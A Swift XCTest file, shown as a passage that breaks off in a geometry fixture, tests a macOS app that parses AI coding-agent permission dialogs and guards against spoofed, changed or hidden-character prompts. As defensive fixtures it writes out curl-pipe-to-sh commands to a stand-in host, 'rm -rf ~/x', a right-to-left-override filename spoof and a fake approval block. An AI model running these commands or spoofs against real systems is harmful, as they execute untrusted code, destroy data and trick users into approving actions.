import AppKit
import SwiftUI
import XCTest
@testable import ProsperApp

/// Claude Code Bash permission, read with dch --read from the #475 probe session.
private let bashScreen = """
⏺ I will clean the build tree and rebuild.

──────────────────────────────────────────────────────────────────────────────────────────
 Bash command

   rm -rf .build && swift build -c release
   Clean and rebuild the release products

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don't ask again for rm commands in /Users/probe/proj
   3. No, and tell Claude what to do differently (esc)
"""

/// Claude Code Edit permission with a diff preview (probe session).
private let editScreen = """
──────────────────────────────────────────────────────────────────────────────────────────
 Edit file
 ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
  41      func tick() -> [AgentSession]? {
  42 -        let dirs = dirs()
  42 +        let dirs = self.dirs()
  43          let snap = scanner.scan(dirs)
 ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 Do you want to make this edit to AgentIslandModel.swift?
 ❯ 1. Yes
   2. Yes, allow all edits during this session (shift+tab)
   3. No, and tell Claude what to do differently (esc)
"""

/// AskUserQuestion, 4 options plus Claude's two extras (probe session).
private let askFourScreen = """
──────────────────────────────────────────────────────────────────────────────────────────
 ←  ☐ Target  ✔ Submit  →

Which deployment target?

❯ 1. Production
     Live customer traffic, needs a release tag
  2. Staging
     Pre-release environment
  3. Local only
     Docker compose on this Mac
  4. Preview
     A throwaway per-branch deploy
  5. Type something.
──────────────────────────────────────────────────────────────────────────────────────────
  6. Chat about this

Enter to select · ↑/↓ to navigate · Esc to cancel
"""

/// Ordinary output with a numbered list and the idle input box (probe session).
private let ordinaryScreen = """
⏺ Plan:
  1. Add the parser
  2. Wire the controller
  3. Write the tests

──────────────────────────────────────────────────────────────────────────────────────────
❯
──────────────────────────────────────────────────────────────────────────────────────────
  ? for shortcuts
"""

/// codex exec approval: blocked, no numbers (probe session).
private let codexScreen = """
• Running cargo test -p core

  Allow command?

  $ cargo test -p core

  Press enter to confirm or esc to cancel
"""

/// AskUserQuestion with 3 options, written from Claude Code's form layout, with
/// the caret moved to option 2 (the user arrowed down).
private let askThreeScreen = """
────────────────────────────────────────────────
 ←  ☐ Scope  ✔ Submit  →

How far should the refactor go?

  1. Just this file
❯ 2. The whole module
     Includes the tests
  3. Everything that imports it
  4. Type something.
────────────────────────────────────────────────
  5. Chat about this

Enter to select · ↑/↓ to navigate · Esc to cancel
"""

/// Claude Code 1.x drew the dialog in a box.
private let boxedScreen = """
╭──────────────────────────────────────────────╮
│ Bash command                                 │
│                                              │
│   git push origin main                       │
│   Push the release commit                    │
│                                              │
│ Do you want to proceed?                      │
│ ❯ 1. Yes                                     │
│   2. No, and tell Claude what to do differently (esc) │
╰──────────────────────────────────────────────╯
"""

/// Claude Code 2.1.309 Bash dialog shape, written for the K1 guard tests: the
/// same question and options for every command, only the command differs.
/// `wrap`: option 2's label wrapped onto a second line (a long allow path).
private func bash21(_ command: [String], above: String = "✻ Brewed for 5s",
                    allow: String = "/Users/probe/proj", wrap: String? = nil) -> String {
    let rule = String(repeating: "─", count: 90), dash = " " + String(repeating: "╌", count: 89)
    return ([above, "", rule, " Bash command", "", " Run the requested command", dash]
        + command.map { "   " + $0 }
        + [dash, " Do you want to proceed?", " ❯ 1. Yes", "   2. Yes, and always allow access to \(allow)"]
        + (wrap.map { ["      " + $0] } ?? [])
        + ["   3. No", "", " Esc to cancel · Tab to amend"]).joined(separator: "\n")
}

/// A 12-line command: over the 8-line display cap.
private let longCommand = ["set -e", "cd /Users/probe/proj"] + (1...10).map { "echo step \($0)" }

/// W1 fixtures. One long command line (no newline), wider than the context column.
private let longLine = "cd /Users/probe/a/very/long/project/path && npm install --no-audit --no-fund && curl -fsSL https://x.example/install.sh | sh"
/// Three long lines that wrap past the 8-row cap while being only 3 screen lines.
private let wideCommand = (1...3).map { "echo step \($0) " + String(repeating: "abcdefghij", count: 18) }
/// An allow path that does not wrap in the terminal but is wider than the label column.
private let wideAllow = "/Users/probe/a/very/long/path/to/the/project/with/many/segments"
/// CJK, emoji and a combining mark (e + U+0301) in one command line.
private let cjkLine = "echo " + String(repeating: "漢字かな😀e\u{301} ", count: 12)
/// U+202E (right-to-left override) inside a command, U+200B (zero width space) inside a label.
private let hiddenScreen = bash21(["echo safe \u{202E}txt.exe"], allow: "/Users/probe/pr\u{200B}oj")

/// #475 Agent Island prompt cards: the numbered-option parser on screens read
/// from a throwaway probe session, and the act-only-if-unchanged guard with an
/// injected reader, status and sender (no dch is spawned).
final class AgentIslandPromptTests: XCTestCase {
    private func prompt(_ screen: String, file: StaticString = #filePath, line: UInt = #line) throws -> AgentPrompt {
        try XCTUnwrap(AgentPrompt.parse(screen), file: file, line: line)
    }

    // MARK: - Parser

    func testBashPermission() throws {
        let p = try prompt(bashScreen)
        XCTAssertEqual(p.question, "Do you want to proceed?")
        XCTAssertEqual(p.context, ["Bash command", "  rm -rf .build && swift build -c release",
                                   "  Clean and rebuild the release products"],
                       "inside the dialog's top rule, blank lines dropped, common indent removed")
        XCTAssertEqual(p.options, [
            AgentPromptOption(digit: 1, label: "Yes", hint: nil),
            AgentPromptOption(digit: 2, label: "Yes, and don't ask again for rm commands in /Users/probe/proj", hint: nil),
            AgentPromptOption(digit: 3, label: "No, and tell Claude what to do differently", hint: "esc"),
        ])
        XCTAssertEqual(p.options.enumerated().map { $1.style(first: $0 == 0) }, [.accent, .plain, .deny])
        XCTAssertEqual(AgentPrompt.card(screen: bashScreen), .prompt(p))
    }

    func testEditPermissionWithDiffPreview() throws {
        let p = try prompt(editScreen)
        XCTAssertEqual(p.question, "Do you want to make this edit to AgentIslandModel.swift?")
        XCTAssertEqual(p.context, ["41      func tick() -> [AgentSession]? {", "42 -        let dirs = dirs()",
                                   "42 +        let dirs = self.dirs()", "43          let snap = scanner.scan(dirs)"],
                       "the dashed rule under the diff is skipped, the one above it ends the context")
        XCTAssertEqual(p.options.map(\.label), ["Yes", "Yes, allow all edits during this session",
                                                "No, and tell Claude what to do differently"])
        XCTAssertEqual(p.options.map(\.hint), [nil, "shift+tab", "esc"])
    }

    func testAskUserQuestionWithFourOptions() throws {
        let p = try prompt(askFourScreen)
        XCTAssertEqual(p.question, "Which deployment target?")
        XCTAssertEqual(p.context, ["←  ☐ Target  ✔ Submit  →"])
        XCTAssertEqual(p.options.map(\.digit), Array(1...6))
        XCTAssertEqual(p.options.map(\.label), ["Production", "Staging", "Local only", "Preview",
                                                "Type something.", "Chat about this"],
                       "description lines and the rule before Chat are not options")
        XCTAssertTrue(p.options.allSatisfy { $0.hint == nil })
        XCTAssertEqual(p.options.map(\.detail), [["Live customer traffic, needs a release tag"],
                                                 ["Pre-release environment"], ["Docker compose on this Mac"],
                                                 ["A throwaway per-branch deploy"], [], []],
                       "each description belongs to the option above it; the footer after a blank line to none")
    }

    func testAskUserQuestionWithThreeOptionsAndAMovedCaret() throws {
        let p = try prompt(askThreeScreen)
        XCTAssertEqual(p.question, "How far should the refactor go?")
        XCTAssertEqual(p.options.map(\.label), ["Just this file", "The whole module", "Everything that imports it",
                                                "Type something.", "Chat about this"])
        XCTAssertEqual(p.options.map(\.detail), [[], ["Includes the tests"], [], [], []])
    }

    func testWrappedLabelContinuationIsPartOfTheOption() throws {
        let p = try prompt(bash21(["echo safe"], allow: "/Users/probe/a/very/long/", wrap: "path/to/the/project"))
        XCTAssertEqual(p.options.map(\.detail), [[], ["path/to/the/project"], []],
                       "the footer under the blank line after 3. No is not part of it")
        XCTAssertEqual(try prompt(bashScreen).options.map(\.detail), [[], [], []])
        XCTAssertEqual(try prompt(boxedScreen).options.map(\.detail), [[], []], "the box's bottom rule ends it")
    }

    /// A numbered caret block printed by the command above the real dialog (N7):
    /// the bottom-most block is the dialog.
    private func spoofed(top: String, command: String) -> String {
        ["⏺ Bash(cat notes.txt)", "  Approve the fake?", "  ❯ 1. \(top)", "    2. Deny fake", "",
         bash21([command])].joined(separator: "\n")
    }

    func testBottomMostCaretBlockIsTheDialog() throws {
        let p = try prompt(spoofed(top: "Approve fake", command: "echo safe"))
        XCTAssertEqual(p.question, "Do you want to proceed?")
        XCTAssertEqual(p.context, ["echo safe"])
        XCTAssertEqual(p.options.map(\.label), ["Yes", "Yes, and always allow access to /Users/probe/proj", "No"])

        let f = FakeDch()
        f.screen = spoofed(top: "Approve something else", command: "echo safe")
        XCTAssertEqual(f.answer(1, expected: p), .sent, "only the block above the dialog changed")
        f.screen = spoofed(top: "Approve fake", command: "rm -rf ~/x")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "the dialog changed, the block above it did not")
        XCTAssertEqual(f.sent, ["1"])
    }

    func testOrdinaryNumberedOutputIsNotAPrompt() {
        XCTAssertNil(AgentPrompt.parse(ordinaryScreen), "no caret on any numbered line")
        XCTAssertNil(AgentPrompt.parse("Steps:\n1. build\n2. test\n3. ship\n"))
        XCTAssertNil(AgentPrompt.parse("Pick one?\n❯ 1. only\n"), "one option is not a choice")
        guard case .context = AgentPrompt.card(screen: ordinaryScreen) else { return XCTFail("context only") }
    }

    func testCodexConfirmHasNoNumbersSoContextOnly() {
        XCTAssertNil(AgentPrompt.parse(codexScreen))
        XCTAssertEqual(AgentPrompt.card(screen: codexScreen), .context([
            "• Running cargo test -p core", "  Allow command?", "  $ cargo test -p core",
            "  Press enter to confirm or esc to cancel"]))
        XCTAssertEqual(AgentPrompt.card(screen: ""), .context([]), "a vanished session reads empty")
        let long = (1...20).map { "line \($0)" }.joined(separator: "\n")
        XCTAssertEqual(AgentPrompt.tail(long), (13...20).map { "line \($0)" }, "the last 8 lines")
    }

    func testOldBoxedDialog() throws {
        let p = try prompt(boxedScreen)
        XCTAssertEqual(p.question, "Do you want to proceed?")
        XCTAssertEqual(p.context, ["Bash command", "  git push origin main", "  Push the release commit"])
        XCTAssertEqual(p.options, [AgentPromptOption(digit: 1, label: "Yes", hint: nil),
                                   AgentPromptOption(digit: 2, label: "No, and tell Claude what to do differently",
                                                     hint: "esc")])
    }

    func testMalformedListsParseAsNothing() {
        let q = "Do you want to proceed?\n"
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. Yes\n  3. No\n"), "a gap in the numbering")
        XCTAssertNil(AgentPrompt.parse(q + "  2. Yes\n❯ 3. No\n"), "does not start at 1")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. Yes\n❯ 2. No\n"), "two carets")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. [ ] Prod\n  2. [✔] Staging\n"), "multi-select: a digit toggles")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. ☐ Prod\n  2. ☐ Staging\n"))
        XCTAssertNil(AgentPrompt.parse("❯ 1. Yes\n  2. No\n"), "no question line")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. Yes\na\nb\nc\nd\ne\n  2. No\n"), "options too far apart")
        XCTAssertNil(AgentPrompt.option("1.5 GB free"))
        XCTAssertNil(AgentPrompt.option("10. ten"), "one keystroke per click: 1-9 only")
        XCTAssertNil(AgentPrompt.option("0. zero"))
        XCTAssertNil(AgentPrompt.option("١. Arabic one"))
    }

    func testHintsAreKeysOnly() {
        XCTAssertEqual(AgentPrompt.splitHint("No (esc)").1, "esc")
        XCTAssertEqual(AgentPrompt.splitHint("Yes, allow all edits (shift+tab)").0, "Yes, allow all edits")
        XCTAssertEqual(AgentPrompt.splitHint("Local (docker)").1, nil, "a word in parentheses stays in the label")
        XCTAssertEqual(AgentPrompt.splitHint("Staging (pre-release)").0, "Staging (pre-release)")
        XCTAssertEqual(AgentPromptOption(digit: 1, label: "No", hint: nil).style(first: true), .deny, "deny wins")
        XCTAssertEqual(AgentPromptOption(digit: 2, label: "Not now", hint: nil).style(first: false), .plain)
    }

    // MARK: - Guard

    private final class FakeDch: @unchecked Sendable {
        var screen = bashScreen
        var status = "blocked\n"
        var sent: [String] = []
        var reads = 0
        let key = AgentSessionKey(dir: "/d", name: "s")
        var io: AgentPromptIO {
            AgentPromptIO(read: { [self] in XCTAssertEqual($0, key); reads += 1; return screen },
                          status: { [self] _ in status },
                          send: { [self] in XCTAssertEqual($0, key); sent.append($1) })
        }
        func answer(_ digit: Int, expected: AgentPrompt) -> AgentPromptAnswer {
            AgentPrompt.answer(key, digit: digit, expected: expected, io: io)
        }
    }

    func testUnchangedPromptSendsExactlyOneDigit() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        XCTAssertEqual(f.answer(2, expected: p), .sent)
        XCTAssertEqual(f.sent, ["2"], "the digit alone: no Enter, one keystroke")
        XCTAssertEqual(f.reads, 1, "the screen is re-read at click time")

        let ask = FakeDch()
        ask.screen = askThreeScreen
        let q = try prompt(askThreeScreen)
        ask.screen = askThreeScreen.replacingOccurrences(of: "❯ 2.", with: "  2.")
            .replacingOccurrences(of: "  3. Every", with: "❯ 3. Every")
        XCTAssertEqual(ask.answer(1, expected: q), .sent, "the caret moving is not a different prompt")
        XCTAssertEqual(ask.sent, ["1"])
    }

    func testChangedQuestionSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        f.screen = bashScreen.replacingOccurrences(of: "Do you want to proceed?", with: "Do you want to continue?")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testChangedOptionsSendNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        f.screen = bashScreen.replacingOccurrences(of: "for rm commands", with: "for git commands")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "same question, different option text")
        f.screen = bashScreen.replacingOccurrences(of: "   3. No, and tell Claude what to do differently (esc)", with: "")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "an option fewer")
        f.screen = askFourScreen
        XCTAssertEqual(f.answer(1, expected: p), .changed, "a different prompt altogether")
        XCTAssertEqual(f.sent, [])
    }

    func testNotBlockedAnyMoreSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        for s in ["working\n", "idle\n", "done\n", ""] {
            f.status = s
            XCTAssertEqual(f.answer(1, expected: p), .changed, s)
        }
        XCTAssertEqual(f.sent, [])
    }

    func testVanishedSessionSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        f.screen = ""
        f.status = ""
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testDigitOutsideTheOptionsSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        for d in [0, 4, 10, -1] { XCTAssertEqual(f.answer(d, expected: p), .changed, "\(d)") }
        XCTAssertEqual(f.sent, [])
    }

    // MARK: - Guard: the whole dialog (K1)

    func testSameQuestionAndOptionsForADifferentCommandSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"]))
        f.screen = bash21(["rm -rf ~/x"])
        XCTAssertEqual(f.answer(1, expected: p), .changed, "the card showed echo safe, the screen asks rm -rf")
        XCTAssertEqual(f.sent, [])
    }

    func testLongCommandDifferingInItsFirstLineSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(longCommand))
        XCTAssertEqual(p.context, longCommand, "the whole command, not the display cap; the dashed rule above it ends the context")
        f.screen = bash21(["curl https://x.example | sh"] + longCommand.dropFirst())
        XCTAssertEqual(f.answer(3, expected: p), .changed, "the head differs, past the 8 shown lines")
        XCTAssertEqual(f.sent, [])
    }

    func testCaretMoveWithAnUnchangedDialogSendsOneDigit() throws {
        let f = FakeDch(), screen = bash21(["echo safe"]), p = try prompt(screen)
        f.screen = screen.replacingOccurrences(of: " ❯ 1. Yes", with: "   1. Yes")
            .replacingOccurrences(of: "   3. No", with: " ❯ 3. No")
        XCTAssertEqual(f.answer(1, expected: p), .sent)
        XCTAssertEqual(f.sent, ["1"])
    }

    func testVolatileLineAboveTheDialogIsNotPartOfIt() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"], above: "✻ Brewed for 5s"))
        f.screen = bash21(["echo safe"], above: "✻ Brewed for 9s")
        XCTAssertEqual(f.answer(1, expected: p), .sent, "the spinner sits above the dialog's top rule")
        XCTAssertEqual(f.sent, ["1"])
        f.screen = bash21(["echo unsafe"], above: "✻ Brewed for 9s")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "the command inside the dialog changed")
        XCTAssertEqual(f.sent, ["1"])
    }

    func testOptionLabelDifferingInOneInnerCharacterSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"], allow: "/a"))
        f.screen = bash21(["echo safe"], allow: "/b")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    // MARK: - Guard: option detail lines (P3a)

    func testDialogsDifferingOnlyInAWrappedContinuationSendNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"], allow: "/Users/probe/", wrap: "proj"))
        f.screen = bash21(["echo safe"], allow: "/Users/probe/", wrap: "../../etc")
        XCTAssertEqual(f.answer(2, expected: p), .changed, "the allow path's wrapped tail differs")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testDialogsDifferingOnlyInOneDescriptionSendNothing() throws {
        let f = FakeDch(), p = try prompt(askFourScreen)
        f.screen = askFourScreen.replacingOccurrences(of: "Pre-release environment", with: "Wipes the database")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testCaretMoveOnADialogWithDetailLinesSendsOneDigit() throws {
        let f = FakeDch(), screen = bash21(["echo safe"], allow: "/Users/probe/", wrap: "proj"), p = try prompt(screen)
        f.screen = screen.replacingOccurrences(of: " ❯ 1. Yes", with: "   1. Yes")
            .replacingOccurrences(of: "   2. Yes,", with: " ❯ 2. Yes,")
        XCTAssertEqual(f.answer(2, expected: p), .sent)
        let ask = FakeDch(), q = try prompt(askFourScreen)
        ask.screen = askFourScreen.replacingOccurrences(of: "❯ 1. Production", with: "  1. Production")
            .replacingOccurrences(of: "  4. Preview", with: "❯ 4. Preview")
        XCTAssertEqual(ask.answer(4, expected: q), .sent)
        XCTAssertEqual(f.sent + ask.sent, ["2", "4"], "exactly one digit each")
    }

    func testOverCapCardShowsTheHeadAndAMarkerAndOnlyDenyIsEnabled() throws {
        let p = try prompt(bash21(longCommand))
        XCTAssertTrue(p.isOverCap)
        XCTAssertEqual(p.shownContext, Array(longCommand.prefix(8)) + ["… 4 more lines"], "the head is shown, the tail is counted")
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true], "approve options off, No on")
        let f = FakeDch()
        f.screen = bash21(longCommand)
        XCTAssertEqual(f.answer(1, expected: p), .changed, "a disabled option never sends")
        XCTAssertEqual(f.answer(3, expected: p), .sent)
        XCTAssertEqual(f.sent, ["3"])

        let short = try prompt(bash21(["echo safe"]))
        XCTAssertFalse(short.isOverCap)
        XCTAssertEqual(short.shownContext, short.context)
        XCTAssertTrue(short.options.allSatisfy { short.isEnabled($0) })
    }

    // MARK: - W1: measured rows, too wide, hidden characters

    private typealias G = AgentIslandGeometry

    private func assertFits(_ rows: [String], _ f: NSFont, _ w: CGFloat, _ what: String,
                            file: StaticString = #filePath, line: UInt = #line) {
        for r in rows {
            XCTAssertLessThanOrEqual(G.width(r, f), w - G.fitMargin, "\(what): \(r)", file: file, line: line)
        }
    }

    func testLongSingleLineCommandWrapsIntoMeasuredRowsAndStaysApprovable() throws {
        let p = try prompt(bash21([longLine])), l = p.layout
        XCTAssertEqual(p.context, [longLine])
        XCTAssertGreaterThan(G.width(longLine, G.contextFont), G.cardContextWidth, "the fixture is wider than the column")
        XCTAssertGreaterThan(l.context.count, 1)
        XCTAssertEqual(l.context.joined(), longLine, "all of it is shown, across rows")
        assertFits(l.context, G.contextFont, G.cardContextWidth, "context row")
        XCTAssertFalse(l.isOverCap)
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, true, true])
        XCTAssertEqual(l.caption, [])
    }

    func testCommandWrappingPastEightRowsIsDenyOnly() throws {
        let p = try prompt(bash21(wideCommand)), l = p.layout
        XCTAssertLessThanOrEqual(p.context.count, AgentPrompt.maxContext, "3 screen lines, under the old line cap")
        XCTAssertTrue(l.isOverCap)
        XCTAssertEqual(l.context.count, AgentPrompt.maxContext + 1)
        XCTAssertTrue(l.context.last!.hasPrefix("… "), l.context.last!)
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true])
        XCTAssertEqual(l.caption.joined(), AgentCardLayout.tooLongCaption)
    }

    func testWideLabelDisablesThatOptionOnly() throws {
        let p = try prompt(bash21(["echo safe"], allow: wideAllow)), l = p.layout
        XCTAssertEqual(p.options[1].detail, [], "one terminal row, no wrapped continuation")
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, false, true], "Yes and No stay on")
        XCTAssertEqual(l.caption.joined(), AgentCardLayout.tooLongCaption)
        XCTAssertGreaterThan(l.labels[1].count, 1, "shown in full across rows, not cut")
        XCTAssertEqual(l.labels[1].joined(), p.options[1].label)

        // A too-wide detail line does it too; a too-wide No does not.
        let d = try prompt(bash21(["echo safe"], allow: "/a", wrap: wideAllow + wideAllow))
        XCTAssertEqual(d.options.map { d.isEnabled($0) }, [true, false, true])
        let no = AgentPrompt(question: "Proceed?", context: [], options: [
            AgentPromptOption(digit: 1, label: "Yes", hint: nil),
            AgentPromptOption(digit: 2, label: "No, " + wideAllow + wideAllow, hint: "esc")])
        XCTAssertEqual(no.options.map { no.isEnabled($0) }, [true, true])
        XCTAssertEqual(no.layout.caption, [], "nothing to approve was hidden")
    }

    func testCJKAndEmojiAreMeasuredNotCounted() throws {
        let p = try prompt(bash21([cjkLine])), rows = p.layout.context
        XCTAssertEqual(p.context, [cjkLine.trimmingCharacters(in: .whitespaces)])
        XCTAssertEqual(rows.joined(), p.context[0])
        assertFits(rows, G.contextFont, G.cardContextWidth, "CJK row")
        // Greedy on measured width: no row could take the next character.
        for (r, next) in zip(rows, rows.dropFirst()) {
            XCTAssertFalse(G.fits(r + String(next.first!), G.contextFont, G.cardContextWidth), r)
        }
        // Counting one ASCII cell per character would give fewer rows.
        let counted = Int((CGFloat(cjkLine.count) * G.width("x", G.contextFont) / (G.cardContextWidth - G.fitMargin)).rounded(.up))
        XCTAssertGreaterThan(rows.count, counted)
        XCTAssertFalse(rows.contains { $0.unicodeScalars.first == "\u{301}" }, "a combining mark stays on its base")
    }

    func testHiddenCharactersDisableApproveAndShowEscaped() throws {
        let p = try prompt(hiddenScreen), l = p.layout
        XCTAssertTrue(p.context.joined().contains("\u{202E}"), "parsed raw")
        XCTAssertTrue(p.hasHiddenCharacters)
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true])
        XCTAssertTrue(l.context.joined().contains("echo safe ⟨U+202E⟩txt.exe"), "\(l.context)")
        XCTAssertTrue(l.labels[1].joined().contains("/Users/probe/pr⟨U+200B⟩oj"), "\(l.labels)")
        XCTAssertFalse((l.context + l.labels.joined()).joined().unicodeScalars.contains(where: AgentPrompt.isHidden))
        XCTAssertEqual(l.caption.joined(), AgentCardLayout.hiddenCaption)
        XCTAssertEqual(AgentPrompt.visible("a\tb\u{7}\u{9B}\u{FEFF}"), "a⟨U+0009⟩b⟨U+0007⟩⟨U+009B⟩⟨U+FEFF⟩")
        XCTAssertEqual(AgentPrompt.visible("漢字 😀 é"), "漢字 😀 é", "printable text renders literally")
        let q = AgentPrompt(question: "Proceed\u{2066}?", context: [], options: p.options)
        XCTAssertEqual(q.options.map { q.isEnabled($0) }, [false, false, true], "in the question too")

        // Both over cap and hidden: the hidden-character caption wins.
        let both = try prompt(bash21(wideCommand + ["x\u{200D}y"]))
        XCTAssertEqual(both.layout.caption.joined(), AgentCardLayout.hiddenCaption)

        // The identity stays the raw text: the escaped spelling on screen is a different dialog.
        let f = FakeDch()
        f.screen = hiddenScreen.replacingOccurrences(of: "\u{202E}", with: "⟨U+202E⟩")
        XCTAssertEqual(f.answer(3, expected: p), .changed)
        f.screen = hiddenScreen
        XCTAssertEqual(f.answer(3, expected: p), .sent)
        XCTAssertEqual(f.sent, ["3"])
    }

    /// W1e: every lineLimit(1) Text in the card renders a string that, measured
    /// with its font, fits its width; so no edit can bring back a silent ellipsis.
    func testEveryOneLineTextInTheCardFitsItsWidth() throws {
        let screens = [bashScreen, editScreen, askFourScreen, askThreeScreen, boxedScreen, bash21(longCommand),
                       bash21([longLine]), bash21(wideCommand), bash21(["echo safe"], allow: wideAllow),
                       bash21(["echo safe"], allow: "/a", wrap: wideAllow + wideAllow), bash21([cjkLine]), hiddenScreen]
        for screen in screens {
            let p = try prompt(screen), l = p.layout
            assertFits(l.question + l.caption, G.questionFont, G.cardInner, "question/caption")
            assertFits(l.context, G.contextFont, G.cardContextWidth, "context")
            for (i, o) in p.options.enumerated() {
                assertFits(l.labels[i], G.labelFont, AgentCardLayout.labelWidth(o), "label")
                assertFits(l.details[i], G.detailFont, AgentCardLayout.detailWidth(o), "detail")
            }
        }
        let long = (bash21([longLine, cjkLine] + wideCommand) + "\n\n").replacingOccurrences(of: "❯", with: " ")
        assertFits(AgentCardLayout.contextRows(AgentPrompt.tail(long)).rows, G.contextFont, G.cardContextWidth, "tail")
        assertFits([AgentPromptCardView.changedText], G.questionFont, G.cardInner, "changed")
    }

    func testAnswerRefusesADisabledDigitForEachReason() throws {
        let cases: [(String, String, Int)] = [("width", bash21(["echo safe"], allow: wideAllow), 2),
                                              ("hidden", hiddenScreen, 1),
                                              ("over cap by wrapped rows", bash21(wideCommand), 1)]
        for (why, screen, digit) in cases {
            let f = FakeDch(), p = try prompt(screen)
            f.screen = screen
            XCTAssertFalse(p.isEnabled(p.options[digit - 1]), why)
            XCTAssertEqual(f.answer(digit, expected: p), .changed, why)
            XCTAssertEqual(f.answer(3, expected: p), .sent, "\(why): No still answers")
            XCTAssertEqual(f.sent, ["3"], why)
        }
    }

    // MARK: - W1-perf: the layout cache

    private func measures() -> Int { G.measures.withLock { $0 } }

    func testASecondLayoutOfAnEqualPromptMeasuresNothing() throws {
        AgentCardLayoutCache.shared.removeAll()   // no eviction mid-test
        let p = try prompt(bash21([longLine + " cache-a", cjkLine]))
        let lines = [longLine + " cache-b", cjkLine]
        _ = p.layout
        _ = AgentIslandGeometry.cardHeight(.context(lines))
        let before = measures()
        let q = try prompt(bash21([longLine + " cache-a", cjkLine]))   // equal, not the same value
        _ = q.layout
        _ = q.isEnabled(q.options[0])
        _ = AgentIslandGeometry.cardHeight(.prompt(q))
        _ = AgentIslandGeometry.cardHeight(.context(lines))
        XCTAssertEqual(measures(), before, "an equal prompt or context hashes, it does not measure")
    }

    func testTheCacheStaysBounded() throws {
        let c = AgentCardLayoutCache.shared
        c.removeAll()
        for i in 0..<(AgentCardLayoutCache.bound + 8) { _ = try prompt(bash21(["echo bound \(i)"])).layout }
        XCTAssertLessThanOrEqual(c.count, 2 * AgentCardLayoutCache.bound, "two tables, each bounded")
        XCTAssertLessThan(c.count, 2 * (AgentCardLayoutCache.bound + 8), "cleared past the bound")
    }

    func testCachedAndFreshLayoutsAgree() throws {
        for screen in [bash21(wideCommand), hiddenScreen, bash21(["echo safe"], allow: wideAllow)] {
            let p = try prompt(screen), cached = p.layout
            AgentCardLayoutCache.shared.removeAll()
            let fresh = AgentCardLayout(p)
            XCTAssertEqual(cached, fresh)
            XCTAssertEqual(p.options.map(cached.isEnabled), p.options.map(fresh.isEnabled))
            XCTAssertEqual(cached.caption, fresh.caption)
            XCTAssertFalse(fresh.caption.isEmpty, "each fixture blocks approve")
        }
    }

    /// The #478 class: the warm call and answer run on a real background queue.
    func testWarmAndAnswerRunOffMain() throws {
        let screen = bash21([longLine + " off-main"]), p = try prompt(screen), f = FakeDch()
        f.screen = screen
        AgentCardLayoutCache.shared.removeAll()
        let done = expectation(description: "background")
        nonisolated(unsafe) var result: (main: Bool, height: CGFloat, answer: AgentPromptAnswer)?
        DispatchQueue(label: "agent-island-test").async {
            let h = AgentIslandGeometry.cardHeight(AgentPrompt.card(screen: screen))
            result = (Thread.isMainThread, h, AgentPrompt.answer(f.key, digit: 1, expected: p, io: f.io))
            done.fulfill()
        }
        wait(for: [done], timeout: 30)
        XCTAssertEqual(result?.main, false)
        XCTAssertEqual(result?.height, AgentIslandGeometry.cardHeight(.prompt(p)))
        XCTAssertEqual(result?.answer, .sent)
        XCTAssertEqual(f.sent, ["1"])
    }

    /// A hint carrying a hidden character is not a key hint: it stays in the label,
    /// so the prompt is deny-only. Hints are never checked separately.
    func testHintWithAHiddenCharacterStaysInTheLabel() throws {
        for bad in ["(esc\u{202E})", "(shift+\u{200B}tab)"] {
            XCTAssertNil(AgentPrompt.splitHint("Yes " + bad).1, bad)
            let screen = "Do you want to proceed?\n❯ 1. Yes \(bad)\n  2. No (esc)\n"
            let p = try prompt(screen)
            XCTAssertNil(p.options[0].hint)
            XCTAssertTrue(p.hasHiddenCharacters, bad)
            XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, true], bad)
        }
    }

    // MARK: - Geometry

    private let notched = AgentIslandGeometry.make(
        frame: CGRect(x: 0, y: 0, width: 1512, height: 982), visibleFrame: CGRect(x: 0, y: 0, width: 1512, height: 950),
        topLeft: CGRect(x: 0, y: 950, width: 663.5, height: 32), topRight: CGRect(x: 848.5, y: 950, width: 663.5, height: 32),
